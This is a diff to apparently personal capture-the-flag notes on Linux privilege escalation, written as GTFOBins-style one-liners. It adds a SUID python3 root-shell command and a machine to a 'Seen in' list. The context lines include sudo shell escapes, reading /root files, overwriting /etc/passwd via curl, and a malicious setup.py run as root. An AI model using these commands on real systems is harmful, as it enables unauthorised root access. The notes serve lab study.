@@ -31,6 +31,7 @@ sudo file -f /root/secret.txt             # file-read: each line echoed in the e
 curl file:///tmp/passwd -o /etc/passwd    # SUID curl: read one file, write another AS ROOT
 sudo pip3 install .                        # dir with malicious setup.py → code runs as root
 sudo python3 -c 'import os; os.execl("/bin/bash", "bash")'  # sudo python3 → shell
+/usr/bin/python3.7 -c 'import os; os.execl("/bin/bash", "bash", "-p")'  # SUID python: "-p" preserves euid → root
 sudo lua -e 'os.execute("/bin/bash")'      # sudo lua → shell
 sudo gcc -wrapper /bin/bash,-s x           # sudo gcc → shell (the -wrapper trick)
 sudo -u <user> /usr/bin/ash                # a pinned *shell* needs no entry — running it is the payload
@@ -43,4 +44,4 @@ sudo -u <user> /usr/bin/ash                # a pinned *shell* needs no entry —
 
 ## Seen in
 
-[[trust]], [[obsession]], [[simple-ctf]], [[vacaciones]], [[hedgehog]], [[borazuwara]], [[hannah-coffee]], [[duque]], [[walkingcms]], [[anonymous-pingu]], [[trailpack]], [[bruteshock]], [[littlepivoting]], [[madeyes-castle]], [[flynn]], [[dance-samba]], [[dark]] (curl `file://` + `-o`), [[file]] (`awk` → julen, `env` → iker, then a pinned `python3 script.py` where the payload goes *inside* the script), [[amor]] (`ruby -e 'exec "/bin/bash"'` → root), [[secretjenkins]] (python3 `-c` pivot → pinguinito, then the pinned-script overwrite → root), [[pkgpoison]] (`pip3 install *` → malicious `setup.py` → root), [[elevator]] (the full tour: `env`, pinned `ash` shell, `ruby`, `lua`, `gcc -wrapper`, then `sudo` itself — six rules, six floors), [[pequeñas-mentirosas]] (python3 `-c` `os.execl` → root, second sighting of the same one-liner)
+[[trust]], [[obsession]], [[simple-ctf]], [[vacaciones]], [[hedgehog]], [[borazuwara]], [[hannah-coffee]], [[duque]], [[walkingcms]], [[anonymous-pingu]], [[trailpack]], [[bruteshock]], [[littlepivoting]], [[madeyes-castle]], [[flynn]], [[dance-samba]], [[dark]] (curl `file://` + `-o`), [[file]] (`awk` → julen, `env` → iker, then a pinned `python3 script.py` where the payload goes *inside* the script), [[amor]] (`ruby -e 'exec "/bin/bash"'` → root), [[secretjenkins]] (python3 `-c` pivot → pinguinito, then the pinned-script overwrite → root), [[pkgpoison]] (`pip3 install *` → malicious `setup.py` → root), [[elevator]] (the full tour: `env`, pinned `ash` shell, `ruby`, `lua`, `gcc -wrapper`, then `sudo` itself — six rules, six floors), [[pequeñas-mentirosas]] (python3 `-c` `os.execl` → root, second sighting of the same one-liner), [[hiddencat]] (SUID `python3.7` `-c` `os.execl … "-p"` → root — the interpreter *is* the GTFOBin, no sudo involved; the `-p` a sudo'd python gets for free, a SUID one must pass itself)
